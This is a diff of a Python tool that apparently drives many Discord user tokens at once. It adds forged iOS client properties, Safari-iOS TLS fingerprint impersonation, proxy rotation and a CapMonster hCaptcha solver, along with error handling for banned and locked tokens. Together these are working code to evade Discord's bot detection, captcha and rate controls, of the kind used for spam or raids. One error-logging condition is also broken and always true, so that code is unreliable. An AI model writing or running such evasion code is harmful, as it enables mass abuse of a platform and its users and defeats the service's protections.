@@ -1,27 +1,32 @@
 import base64
 import ctypes
+import decimal
+from datetime import datetime, timedelta
 import getpass
-import json
+import httpx
 import os
 import random
 import re
+import requests
+from src import *
 import string
 import sys
 import time
+import tls_client
 import types
 from concurrent.futures import ThreadPoolExecutor
-from datetime import datetime, timedelta
-from time import sleep
-import httpx
-import requests
-import tls_client
-from capmonster_python import HCaptchaTask, capmonster
 from colorama import Fore
+from capmonster_python import HCaptchaTask, capmonster
 from decimal import Decimal
-from src import *
+import json
+import random
+from random import randint
+from time import sleep
+import uuid
+
 
 THIS_VERSION = "2.0.0"
-whitelisted = ["1157603083308761118", "1157425827517055017", "1146496916419526727", "1157400926877925558", "1156946611646247013", "1149731357656883311"]
+whitelisted = ["1157603083308761118", "1157425827517055017", "1146496916419526727", "1157400926877925558", "1156946611646247013", "1149731357656883311", "322415832275615746"]
 
 class Config:
     def __init__(self):
@@ -115,9 +120,9 @@ class Output:
         self.config = config
         self.token = token
         self.color_map = {
-            "info": (Fore.BLUE, "<i>"),
+            "info": (Fore.BLUE, "<*>"),
             "bad": (Fore.RED, "<!>"),
-            "good": (Fore.GREEN, "<*>"),
+            "good": (Fore.GREEN, "<+>"),
             "cap": (Fore.CYAN, "<CAP>"),
             "dbg": (Fore.MAGENTA, "<DEBUG>"),
         }
@@ -185,162 +190,119 @@ class Output:
         print(f"{Fore.RED}Text Of The Week:\n {Fore.BLUE}{text}")
         sleep(2.5)
 
-class DiscordProps:
     @staticmethod
-    def get_build_number():
-        scripts = re.compile(r'/assets/.{20}.js', re.I).findall(requests.get("https://discord.com/app", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}).text)
-        scripts.reverse()
-        for v in scripts:
-            content = requests.get(f"https://discord.com{v}", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}).content.decode()
-            if content.find("build_number:\"") != -1:
-                return re.compile(r"build_number:\"(.*?)\"", re.I).findall(content)[0]
+    def error_logger(token, res_text, res_status_code):
+        if res_text.startswith('{"captcha_key"'):
+            Output("bad", config, token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}(Captcha)")
+        elif res_text.startswith('{"message": "401: Unauthorized'):
+            Output("bad", config, token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}(Unauthorized)")
+        elif "Cloudflare" in res_text:
+            Output("bad", config, token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}(CloudFlare Blocked)")
+        elif "\"code\": 40007" in res_text:
+            Output("bad", config, token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}(Token Banned)")
+        elif "\"code\": 40002" in res_text:
+            Output("bad", config, token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}(Locked Token)")
+        elif "\"code\": 10006" in res_text:
+            Output("bad", config, token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}(Invalid Invite)")
+        elif "\"code\": 10004" in res_text:
+            Output("bad", config, token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}(Not In Server)")
+        elif "\"code\": 50013:" or "\"code\": 50001:" in res_text:
+            Output("bad", config, token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}(No Access)")
+        else:
+            Output("bad", config, token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}({res_text})")
 
+class Discord:
+    def __init__(self):
+        os.system('cls')
+        self.build_number = None
+        self.darwin_ver = self.get_darwin_version()
+        self.iv1, self.iv2 = str(randint(15, 16)), str(randint(1, 5))
+        self.app_version = self.get_app_version()
+        self.build_number = self.get_build_number()
+        self.user_agent = f"Discord/{self.build_number} CFNetwork/1408.0.4 Darwin/{self.darwin_ver}"
+        Output("info", config).notime("Getting Discord Info..")
+        sleep(0.5)
+        Output("info", config).notime(f"Build Number: {Fore.RED}{self.build_number}")
+        sleep(0.5)
+        Output("info", config).notime(f"Darwin Versoin: {Fore.RED}{self.darwin_ver}")
+        sleep(0.5)
+        Output("info", config).notime(f"User Agent: {Fore.RED}{self.user_agent}")
+        sleep(0.5)
+        Output("info", config).notime("Successfully Built Headers!!")
+        sleep(1)
+        self.x_super_properties = self.mobile_xprops()
 
-    @staticmethod       
-    def getFingerprint() -> str:
-        res = requests.get(
-            'https://discord.com/api/v9/experiments'
+    def mobile_xprops(self):
+        u = uuid.uuid4().hex; vendor_uuid = f"{u[0:8]}-{u[8:12]}-{u[12:16]}-{u[16:20]}-{u[20:36]}"
+        iphone_models = ["11,2","11,4","11,6","11,8","12,1","12,3","12,5","12,8","13,1","13,2","13,3","13,4","14,2","14,3","14,4","14,5","14,6","14,7","14,8","15,2","15,3",]
+        return base64.b64encode(json.dumps({
+            "os":"iOS",
+            "browser":"Discord iOS",
+            "device":"iPhone"+random.choice(iphone_models),
+            "system_locale":"sv-SE",
+            "client_version":self.app_version,
+            "release_channel":"stable",
+            "device_vendor_id":vendor_uuid,
+            "browser_user_agent":"",
+            "browser_version":"",
+            "os_version":self.iv1+"."+self.iv2,
+            "client_build_number": self.build_number,
+            "client_event_source":None,
+            "design_id":0
+        }).encode()).decode()
+
+    def get_build_number(self):
+        while True:
+            try:
+                build_number = httpx.get(
+                    f"https://discord.com/ios/{self.app_version}/manifest.json").json()["metadata"]["build"]
+                break
+            except:
+                Output("bad", config).notime(f"Couldn't Find Build Number In Manifest Version {self.app_version} Since It Doesn't Exist")
+                self.app_version = float(self.app_version)-1
+                continue
+
+        return build_number
+
+    def get_app_version(self):
+        body = httpx.get(
+        "https://apps.apple.com/us/app/discord-chat-talk-hangout/id985746746",headers={
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+        }).text
+
+        return re.search(r'latest__version">Version (.*?)</p>', body).group(1)
+
+    def get_darwin_version(self):
+        darwin_wiki = httpx.get("https://en.wikipedia.org/wiki/Darwin_(operating_system)").text
+        return re.search(r'Latest release.*?<td class="infobox-data">(.*?) /', darwin_wiki).group(1)
+
+    @property
+    def headers(self):
+        return {
+            "Host": "discord.com",
+            "x-debug-options": "bugReporterEnabled",
+            "Content-Type": "application/json",
+            "Accept": "/",
+            "User-Agent": self.user_agent,
+            "Accept-Language": "sv-SE",
+            "x-discord-locale": "en-US",
+            "x-super-properties": self.x_super_properties,
+        }
+
+discord_props = Discord()
+headers = discord_props.headers
+
+class Client:
+    def get_session(token:str):
+        iv1, iv2 = str(randint(15,16)), str(randint(1,5))
+        session = tls_client.Session(
+            client_identifier = f"safari_ios_{iv1}_{iv2}",
+            random_tls_extension_order = True
         )
-        requests.cookies = res.cookies
-        return res.json()['fingerprint']
-        
-    user_agents = [
-        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9011 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Whale/3.22.205.18 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47',
-        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5823.221 Safari/537.36',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60']
 
-    lang = [
-        "de,de-DE;q=0.9",
-        "en,en-US;q=0.9",
-        "es,es-ES;q=0.9",
-        "fr,fr-FR;q=0.9",
-        "ja;q=0.9",
-        "ru,ru-RU;q=0.9",
-        "pt-BR;q=0.9",
-        "tr;q=0.9",
-        "ar,ar-SA;q=0.9",
-        "zh,zh-CN;q=0.9"]
-
-    brands = [
-        """Not?A_Brand";v="8", "Chromium";v="108""",
-        """Not?A_Brand";v="8", "Firefox";v="92""",
-        """Not?A_Brand";v="8", "Safari";v="15""",
-        """Edge";v="96", "Chromium";v="108""",
-        """Brave";v="1.31", "Chromium";v="108""",
-        """Opera";v="88", "Chromium";v="108""",
-        """Internet Explorer";v="11", "Chromium";v="108"""]
-
-    channels = [
-        "ptb", 
-        "canary", 
-        "stable"] 
-
-    times = [
-        "Europe/Berlin",
-        "America/New_York",
-        "Asia/Tokyo",
-        "Australia/Sydney",
-        "America/Los_Angeles",
-        "Africa/Cairo",
-        "Asia/Dubai",
-        "America/Mexico_City",
-        "Pacific/Auckland",
-        "America/Chicago"]
-
-    zone = random.choice(times)
-    channels = ["ptb", "canary", "stable"] 
-    user_agent = random.choice(user_agents)
-    language = random.choice(lang)
-    channel = random.choice(channels)  
-    brand = random.choice(brands)
-    buildNumber = get_build_number()
-    x_super_properties = base64.b64encode(json.dumps({
-        "os": "Windows",
-        "browser": "Discord Client",
-        "release_channel": channel,
-        "client_version": "1.0.9011",
-        "os_version": "10.0.22638",
-        "os_arch": "x64",
-        "system_locale": "en",
-        "client_build_number": buildNumber,
-        "native_build_number": 30306,
-        "client_version_string": "1.0.9011",
-        "os_version_string": "10.0.22638",
-        "os_arch_string": "x64"}).encode()).decode()
+        session.headers = headers
+        session.headers.update({"Authorization": token})
     
-    default_headers = {
-        'authority': 'discord.com',
-        'accept': '*/*',
-        'accept-language': language, 
-        'origin': 'https://discord.com',
-        'referer': 'https://discord.com/',
-        'sec-ch-ua': brand,
-        'sec-ch-ua-mobile': '?0',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': user_agent,
-        'x-debug-options': 'bugReporterEnabled',
-        'x-discord-locale': 'en-US',
-        'x-discord-timezone': zone,
-        'x-super-properties': x_super_properties,}
-
-os.system('cls')
-Output("info", config).notime("Getting Discord Info..")
-Output("info", config).notime(f"Build Number: {Fore.RED}{DiscordProps.get_build_number()}")
-Output("info", config).notime(f"Finger Print: {Fore.RED}{DiscordProps.getFingerprint()}")
-Output("info", config).notime(f"User Agent: {Fore.RED}{DiscordProps.user_agent[:80]}...")
-
-class Header:
-    @staticmethod
-    def tls_session() -> tls_client.Session:
-        client = tls_client.Session(
-            client_identifier=f"chrome_{random.randint(110, 116)}",
-            random_tls_extension_order=True,
-            ja3_string="769,47-53-5-10-49161-49162-49171-49172-50-56-19-4,0-10-11,23-24-25,0",
-            h2_settings={
-                "HEADER_TABLE_SIZE": 65536,
-                "MAX_CONCURRENT_STREAMS": 1000,
-                "INITIAL_WINDOW_SIZE": 6291456,
-                "MAX_HEADER_LIST_SIZE": 262144
-            },
-            h2_settings_order=[
-                "HEADER_TABLE_SIZE",
-                "MAX_CONCURRENT_STREAMS",
-                "INITIAL_WINDOW_SIZE",
-                "MAX_HEADER_LIST_SIZE"
-            ],
-            supported_signature_algorithms=[
-                "ECDSAWithP256AndSHA256",
-                "PSSWithSHA256",
-                "PKCS1WithSHA256",
-                "ECDSAWithP384AndSHA384",
-                "PSSWithSHA384",
-                "PKCS1WithSHA384",
-                "PSSWithSHA512",
-                "PKCS1WithSHA512",
-            ],
-            supported_versions=["GREASE", "1.3", "1.2"],
-            key_share_curves=["GREASE", "X25519"],
-            cert_compression_algo="brotli",
-            pseudo_header_order=[":method", ":authority", ":scheme", ":path"],
-            connection_flow=15663105,
-            header_order=["accept", "user-agent", "accept-encoding", "accept-language"]
-        )
         if config._get("use_proxies"):
             proxy = ProxyManager.clean_proxy(ProxyManager.random_proxy())
             if isinstance(proxy, str):
@@ -351,49 +313,9 @@ class Header:
             elif isinstance(proxy, dict):
                 proxy_dict = proxy
 
-            client.proxies = proxy_dict
-        
-        return client
+            session.proxies = proxy_dict
 
-    @staticmethod       
-    def getFingerprint() -> str:
-        res = requests.get(
-            'https://discord.com/api/v9/experiments'
-        )
-        requests.cookies = res.cookies
-        return res.json()['fingerprint']
-
-    @staticmethod
-    def get_cookies(session, headers):
-        cookies = dict(
-            session.get("https://discord.com", headers=headers).cookies
-        )
-
-        cookies["__cf_bm"] = (
-            "0duPxpWahXQbsel5Mm.XDFj_eHeCKkMo.T6tkBzbIFU-1679837601-0-"
-            "AbkAwOxGrGl9ZGuOeBGIq4Z+ss0Ob5thYOQuCcKzKPD2xvy4lrAxEuRAF1Kopx5muqAEh2kLBLuED6s8P0iUxfPo+IeQId4AS3ZX76SNC5F59QowBDtRNPCHYLR6+2bBFA=="
-        )
-        cookies["locale"] = "en-US"
-
-        return cookies
-
-    @staticmethod
-    def get_client(token):
-        default_headers = DiscordProps.default_headers.copy()
-        default_headers["authorization"] = token
-        fingerprint = Header.getFingerprint()
-        session = Header.tls_session()
-        cookie = Header.get_cookies(session, headers=default_headers)
-        default_headers["x-fingerprint"] = fingerprint
-        default_headers["cookie"] = (
-            f'__dcfduid={cookie["__dcfduid"]}; '
-            f'__sdcfduid={cookie["__sdcfduid"]}; '
-            f'__cfruid={cookie["__cfruid"]}; '
-            f'__cf_bm={cookie["__cf_bm"]}; '
-            f'locale={cookie["locale"]}'
-        )
-    
-        return session, default_headers, cookie
+        return session
 
 class ProxyManager:
     def get_proxies():
@@ -546,10 +468,9 @@ class utility:
 
     def get_message(token, channel_id, message_id, session=None, headers=None, cookie=None):
         if session is None or headers is None or cookie is None:
-            session, headers, cookie = Header.get_client(token)
-
+            session = Client.get_session(token)
         try:
-            response = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=1&around={message_id}", headers=headers, cookies=cookie).json()
+            response = session.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=1&around={message_id}").json()
             return response[0]
         except Exception as e:
             return {"code": 10008}
